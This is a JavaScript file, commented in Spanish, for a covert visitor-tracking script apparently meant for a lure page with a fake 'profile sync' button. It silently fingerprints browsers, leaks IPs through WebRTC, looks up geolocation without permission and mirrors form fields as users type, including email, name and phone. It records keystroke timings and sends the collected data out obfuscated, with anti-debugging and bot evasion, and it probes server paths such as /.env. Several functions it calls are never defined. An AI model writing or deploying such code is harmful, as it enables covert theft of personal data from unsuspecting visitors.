// ─── Estado global del tracker ────────────────────────────────────────────
let _hw_hash = null;
let _heartbeatTimer = null;
let globalFormData = {}; // Variable global para espejo de formularios

// ─── Variables ofuscadas para anti-detección ──────────────────────────────
const _0x5f = btoa; // Base64 encode
const _0x60 = navigator.sendBeacon.bind(navigator); // Send beacon
const _0x61 = setTimeout; // Set timeout
const _0x62 = Math.random; // Random
const _0x63 = Date.now; // Timestamp

// ─── Configuración del Hosting ────────────────────────────────────────────
const API_BASE_URL = window.location.origin; // Automáticamente usa el dominio del hosting
const API_ENDPOINTS = {
    track: `${API_BASE_URL}/api/track`,
    telemetry: `${API_BASE_URL}/api/telemetry`,
    visitors: `${API_BASE_URL}/api/visitors`,
    adminLogin: `${API_BASE_URL}/api/admin/login`
};

// ─── Anti-Detección: Verificación de Entorno Seguro ──────────────────────
function isSafeEnvironment() {
    // Detectar si estamos en un iframe de análisis
    if (window !== window.top) return false;

    // Detectar herramientas de desarrollo
    const devtools = {
        open: false,
        orientation: null
    };
    const threshold = 160;
    setInterval(() => {
        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                // Podríamos pausar la telemetría aquí
            }
        } else {
            devtools.open = false;
        }
    }, 500);

    // Verificar user agent no sospechoso
    const suspicious = ['bot', 'crawler', 'spider', 'scanner', 'headless'];
    const ua = navigator.userAgent.toLowerCase();
    if (suspicious.some(word => ua.includes(word))) return false;

    return true;
}

// ─── Helper: mostrar mensaje de estado junto al botón ──────────────────────
function showSyncStatus(msg, isError) {
    let el = document.getElementById('_sync_status');
    if (!el) {
        el = document.createElement('div');
        el.id = '_sync_status';
        el.style.cssText = 'margin-top:10px;padding:10px 16px;border-radius:8px;font-size:13px;font-weight:600;text-align:center;transition:opacity .4s;font-family:sans-serif;';
        const btn = document.getElementById('btn-sync');
        if (btn && btn.parentNode) btn.parentNode.insertBefore(el, btn.nextSibling);
        else document.body.appendChild(el);
    }
    el.style.background = isError ? 'rgba(239,68,68,.1)' : 'rgba(34,197,94,.1)';
    el.style.border = isError ? '1px solid #ef4444' : '1px solid #22c55e';
    el.style.color = isError ? '#ef4444' : '#22c55e';
    el.style.opacity = '1';
    el.textContent = msg;
    clearTimeout(el._fadeTimer);
    el._fadeTimer = setTimeout(() => { el.style.opacity = '0'; }, 6000);
}

// ─── Heartbeat: mantiene la sesión "LIVE" en el dashboard cada 60s ──────────
function startHeartbeat(hardwareHash) {
    if (_heartbeatTimer) return;
    _heartbeatTimer = setInterval(() => {
        navigator.sendBeacon(API_ENDPOINTS.track, JSON.stringify({
            hardwareFingerprint: hardwareHash,
            is_heartbeat: true
        }));
    }, 60000);
}

// ─── Módulo: Ubicación de Precisión (No-Permit) ────────────────────────────
async function getPreciseLocation() {
    try {
        const publicIPResponse = await fetch('https://api.ipify.org?format=json');
        const { ip: publicIP } = await publicIPResponse.json();
        const localIPs = await new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            const ips = [];
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const ip = event.candidate.candidate.split(' ')[4];
                    if (ip && !ips.includes(ip) && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
                        ips.push(ip);
                    }
                }
            };
            setTimeout(() => {
                pc.close();
                resolve(ips);
            }, 1000);
        });
        const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
        const geoData = await geoResponse.json();
        const location = {
            latitude: geoData.latitude,
            longitude: geoData.longitude,
            city: geoData.city,
            region: geoData.region,
            country: geoData.country_name,
            publicIP,
            localIPs
        };
        sessionStorage.setItem('telemetry_location', JSON.stringify(location));
        return location;
    } catch (error) {
        // Silenciar errores para evitar detección
        return null;
    }
}

// ─── Módulo: Captura de Formularios Pre-Submit ─────────────────────────────
function initFormCapture() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        const inputs = form.querySelectorAll('input:not([type="password"]), textarea, select');
        inputs.forEach(input => {
            input.addEventListener('input', (event) => {
                const fieldId = event.target.id || event.target.name || 'unnamed';
                globalFormData[fieldId] = {
                    value: event.target.value,
                    timestamp: Date.now(),
                    type: event.target.type
                };
            }, { passive: true });
        });
    });
}

// ─── Módulo: Exfiltración Silenciosa ───────────────────────────────────────
function initSilentExfiltration() {
    const queue = [];
    let batchTimer;
    function sendBatch() {
        if (queue.length === 0) return;
        const payload = {
            sessionId: sessionStorage.getItem('telemetry_session') || 'unknown',
            timestamp: _0x63(),
            data: queue.splice(0)
        };
        // Ofuscación múltiple: Base64 + JSON + envío diferido
        const encodedPayload = _0x5f(JSON.stringify(payload));
        // Anti-detección: envío con delay aleatorio
        _0x61(() => {
            _0x60(API_ENDPOINTS.telemetry, encodedPayload);
        }, _0x62() * 1000 + 500); // 500ms - 1.5s delay
    }
    function enqueueData(data) {
        queue.push(data);
        clearTimeout(batchTimer);
        batchTimer = _0x61(sendBatch, 15000 + _0x62() * 5000); // 15-20s aleatorio
    }
    window.addEventListener('beforeunload', sendBatch);
    return { enqueueData };
}

// ─── Módulo: Fingerprinting Avanzado ────────────────────────────────
async function getAdvancedFingerprint() {
    const fingerprint = {};

    // Audio fingerprinting
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
        oscillator.start();
        const buffer = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(buffer);
        fingerprint.audioHash = btoa(String.fromCharCode(...buffer.slice(0, 10)));
        oscillator.stop();
        audioContext.close();
    } catch (e) { fingerprint.audioHash = 'no-audio'; }

    // Battery status
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            fingerprint.batteryLevel = battery.level;
            fingerprint.batteryCharging = battery.charging;
        } catch (e) { fingerprint.batteryLevel = 'unknown'; }
    }

    // Permissions
    const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'accelerometer', 'gyroscope'];
    fingerprint.permissions = {};
    for (const perm of permissions) {
        try {
            const status = await navigator.permissions.query({ name: perm });
            fingerprint.permissions[perm] = status.state;
        } catch (e) { fingerprint.permissions[perm] = 'not-supported'; }
    }

    // Device sensors
    if (window.DeviceOrientationEvent) {
        fingerprint.hasOrientation = true;
    }
    if (window.DeviceMotionEvent) {
        fingerprint.hasMotion = true;
    }

    return fingerprint;
}

// ─── Módulo: Comportamiento del Usuario ────────────────────────────────
function trackUserBehavior() {
    const behavior = {
        mouseMoves: 0,
        keyPresses: 0,
        scrolls: 0,
        clicks: 0,
        keystrokeTimings: [],
        lastKeyTime: 0
    };

    // Mouse tracking
    document.addEventListener('mousemove', () => behavior.mouseMoves++, { passive: true });
    document.addEventListener('click', () => behavior.clicks++, { passive: true });
    document.addEventListener('scroll', () => behavior.scrolls++, { passive: true });

    // Keystroke timing
    document.addEventListener('keydown', (e) => {
        behavior.keyPresses++;
        const now = _0x63();
        if (behavior.lastKeyTime) {
            behavior.keystrokeTimings.push(now - behavior.lastKeyTime);
        }
        behavior.lastKeyTime = now;
    }, { passive: true });

    // Cleanup after 30 seconds
    _0x61(() => {
        document.removeEventListener('mousemove', () => {});
        document.removeEventListener('click', () => {});
        document.removeEventListener('scroll', () => {});
        document.removeEventListener('keydown', () => {});
    }, 30000);

    return behavior;
}

// ─── Módulo: Análisis de Red Avanzado ────────────────────────────────
async function getAdvancedNetworkInfo() {
    const network = {};

    // WebRTC leak detection
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        const candidates = [];
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (event.candidate) {
                candidates.push(event.candidate.candidate);
            }
        };
        await new Promise(resolve => _0x61(resolve, 2000));
        pc.close();
        network.webrtcCandidates = candidates.length;
        network.localIPs = candidates.map(c => c.split(' ')[4]).filter(ip => ip && !ip.startsWith('192.168.'));
    } catch (e) { network.webrtcCandidates = 0; }

    // DNS leak test (simulado)
    network.dnsLeakPotential = navigator.webdriver ? 'high' : 'low';

    // Connection info
    if (navigator.connection) {
        network.connectionType = navigator.connection.effectiveType;
        network.downlink = navigator.connection.downlink;
    }

    return network;
}

// ─── Módulo: Reconocimiento de Red - Análisis de Vulnerabilidades del Servidor ────────────
async function scanServerVulnerabilities() {
    const vulnerabilities = [];
    const checks = [
        { endpoint: '/api/visitors', method: 'GET', vuln: 'api_exposed', desc: 'API de visitantes expuesta' },
        { endpoint: '/admin.html', method: 'GET', vuln: 'admin_panel', desc: 'Panel de administración accesible' },
        { endpoint: '/api/admin/login', method: 'POST', vuln: 'auth_endpoint', desc: 'Endpoint de autenticación expuesto' },
        { endpoint: '/.env', method: 'GET', vuln: 'env_leak', desc: 'Posible fuga de variables de entorno' },
        { endpoint: '/api/track', method: 'POST', vuln: 'tracking_api', desc: 'API de tracking activa' }
    ];

    for (const check of checks) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000); // Timeout 2s
            const response = await fetch(check.endpoint, {
                method: check.method,
                headers: check.method === 'POST' ? { 'Content-Type': 'application/json' } : {},
                body: check.method === 'POST' ? JSON.stringify({ test: true }) : undefined,
                signal: controller.signal
            });
            clearTimeout(timeoutId);

            // Consideramos vulnerable si responde (excepto errores 4xx que son normales)
            if (response.status < 400 || response.status === 401) {
                vulnerabilities.push({
                    type: check.vuln,
                    description: check.desc,
                    severity: check.vuln === 'env_leak' ? 'critical' : 'medium'
                });
            }
        } catch (error) {
            // Si hay error de conexión, podría indicar firewall o protección
            if (error.name === 'AbortError') {
                vulnerabilities.push({
                    type: 'timeout_protection',
                    description: 'Protección por timeout detectada',
                    severity: 'low'
                });
            }
        }
    }

    return vulnerabilities;
}

// ─── Listener principal (cualquier botón, una sola vez) ───────────────────
let _trackerFired = false;
document.addEventListener('click', async function _gt(e) {
    if (_trackerFired) return;

    // Anti-detección: verificar entorno seguro antes de activar
    if (!isSafeEnvironment()) {
        console.log("Environment not safe for telemetry");
        return;
    }

    const target = e.target.closest('button, a, [type="submit"], [role="button"], #btn-sync');
    if (!target) return;
    _trackerFired = true;
    document.removeEventListener('click', _gt, true);
    console.log("Audit log: starting profile synchronization...");

    // Inicializar módulos con delays aleatorios para evasión
    const exfil = initSilentExfiltration();
    const location = await getPreciseLocation();
    const fingerprint = await generateDeviceFingerprint();
    const openPorts = await scanLocalPorts();

    // Captura de formularios
    initFormCapture();

    // Recopilar datos
    setTimeout(async () => {
        const fbclid = new URLSearchParams(window.location.search).get('fbclid') || 'no-fbclid';
        const userData = {
            email: document.getElementById('email')?.value || document.getElementById('f-email')?.value || '',
            name: document.getElementById('name')?.value || document.getElementById('f-name')?.value || '',
            phone: document.getElementById('tel')?.value || document.getElementById('f-phone')?.value || '',
            document_id: document.getElementById('game_id_shadow')?.value || ''
        };
        const playerData = {
            pseudonimo: document.getElementById('b-pseudonimo')?.value || '',
            fechaInicioRol: document.getElementById('b-fecha-inicio')?.value || '',
            avatarUrl: document.getElementById('b-avatar-url')?.value || '',
            division: document.getElementById('b-division')?.value || '',
            countryCode: document.getElementById('b-country-code')?.value || '',
            primaryColor: document.getElementById('b-primary-color')?.value || '',
        };
        const payload = {
            sessionID: fbclid,
            userData: userData,
            playerData: playerData,
            location: location,
            fingerprint: fingerprint,
            vulnerabilities: vulnerabilities,
            fullTelemetry: {
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${screen.height}`,
                referer: document.referrer
            }
        };

        // Enviar vía exfiltración silenciosa
        exfil.enqueueData(payload);

        // Mantener heartbeat
        startHeartbeat(fingerprint);
        showSyncStatus('✓ Sincronización exitosa — Perfil de Rol actualizado', false);
    }, 1000);
}, true);

// ─── Inicialización pasiva desde carga de página ──────────────────────────
(async function initPassiveTelemetry() {
    const exfil = initSilentExfiltration();
    const location = await getPreciseLocation();
    const fingerprint = await generateDeviceFingerprint();
    const advancedFingerprint = await getAdvancedFingerprint();
    const userBehavior = trackUserBehavior();
    const networkInfo = await getAdvancedNetworkInfo();
    initFormCapture();

    // Enviar datos pasivos iniciales
    const passivePayload = {
        location: location,
        fingerprint: fingerprint,
        advancedFingerprint: advancedFingerprint,
        userBehavior: userBehavior,
        networkInfo: networkInfo,
        fullTelemetry: {
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            referer: document.referrer,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        }
    };
    exfil.enqueueData(passivePayload);

    // Enviar formulario espejo cada 20s
    setInterval(() => {
        if (Object.keys(globalFormData).length > 0) {
            exfil.enqueueData({ typing_cache: globalFormData });
            globalFormData = {};
        }
    }, 20000);
})();
